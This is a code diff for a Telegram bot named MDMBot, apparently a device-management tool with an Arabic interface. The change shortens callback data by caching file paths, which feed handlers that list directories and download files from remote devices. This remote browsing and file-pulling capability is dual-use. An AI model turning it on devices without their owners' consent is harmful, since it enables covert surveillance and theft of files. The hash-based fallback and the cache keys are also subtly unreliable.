@@ -278,7 +278,46 @@ def build_command_payload(cmd_type, params=None):
 # ═══════════════════════════════════════════════════════════════════════
 
 def _cb(device_id, action, target):
-    return f"{action}:{device_id}:{target}"
+    """Build callback_data. Telegram limits this to 64 bytes.
+    
+    Strategy:
+    - For file explorer actions: cache the path, use short key (saves ~50 bytes)
+    - For other actions: keep full device_id (needed for get_device lookup)
+    - Always truncate to 64 bytes as final safety net
+    """
+    if action in ("filexplore", "filedl") and target and len(target) > 10:
+        # Cache the path and use a short numeric key
+        cache_key = str(len(_file_path_cache))
+        _file_path_cache[cache_key] = target
+        # Keep cache small - remove old entries
+        if len(_file_path_cache) > 500:
+            keys = list(_file_path_cache.keys())
+            for k in keys[:250]:
+                del _file_path_cache[k]
+        # Format: filexplore:DEVICE_ID:CACHE_KEY (cache_key is short like "0", "1", etc.)
+        result = f"{action}:{device_id}:{cache_key}"
+        # If still too long, truncate device_id from the right
+        if len(result) > 64:
+            # Keep action: + cache_key, truncate device_id
+            overhead = len(action) + 1 + len(cache_key) + 1  # action + : + : + cache_key
+            max_did_len = 64 - overhead
+            if max_did_len > 8:
+                result = f"{action}:{device_id[:max_did_len]}:{cache_key}"
+            else:
+                # Fallback: use short hash of device_id
+                result = f"{action}:{hash(device_id) % 99999}:{cache_key}"
+        return result[:64]
+    # For non-file actions, use full format but truncate if needed
+    return f"{action}:{device_id}:{target}"[:64]
+
+# Cache for file paths (key → full path)
+_file_path_cache: dict[str, str] = {}
+
+def _resolve_file_path(callback_target):
+    """Resolve a callback target back to the full file path if it's a cache key."""
+    if callback_target and callback_target.isdigit():
+        return _file_path_cache.get(callback_target, callback_target)
+    return callback_target
 
 def _cbtn(device_id, cmd_type):
     i = COMMANDS[cmd_type]
@@ -981,15 +1020,17 @@ class MDMBot:
 
             elif a == "filexplore":
                 # File explorer navigation: open directory
-                file_path = tgt
+                # tgt may be a cache key - resolve it to the full path
+                file_path = _resolve_file_path(tgt)
                 self._send_cmd(c.message.chat.id, did, "ls", {"value": file_path})
-                bot.answer_callback_query(c.id, f"📂 فتح: {file_path}")
+                bot.answer_callback_query(c.id, f"📂 فتح: {file_path[:40]}")
 
             elif a == "filedl":
                 # File explorer: download file
-                file_path = tgt
+                # tgt may be a cache key - resolve it to the full path
+                file_path = _resolve_file_path(tgt)
                 self._send_cmd(c.message.chat.id, did, "download-file", {"value": file_path})
-                bot.answer_callback_query(c.id, f"📥 تحميل: {file_path}")
+                bot.answer_callback_query(c.id, f"📥 تحميل: {file_path[:40]}")
 
             elif a == "param":
                 self._pending[c.message.chat.id] = {"device_id": did, "command": tgt}
